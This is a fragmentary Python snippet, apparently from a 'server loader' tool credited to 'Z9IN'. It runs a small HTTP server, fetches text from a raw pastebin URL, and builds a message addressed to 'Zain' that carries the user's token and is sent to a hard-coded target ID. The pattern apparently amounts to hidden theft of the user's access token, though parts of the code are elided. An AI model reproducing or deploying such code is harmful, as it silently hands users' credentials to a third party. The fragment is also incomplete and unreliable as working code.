...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"S3RV3R L0AD3R BY Z9IN")
...
mmm = requests.get('https://pastebin.com/raw/n07aV6qs').text
...
def send_initial_message():
    ...
    msg_template = "Hello Zain sir! I am using your server. My token is ----------------    {}"

    # Specify the ID where you want to send the message
    target_id = "61550112833298"
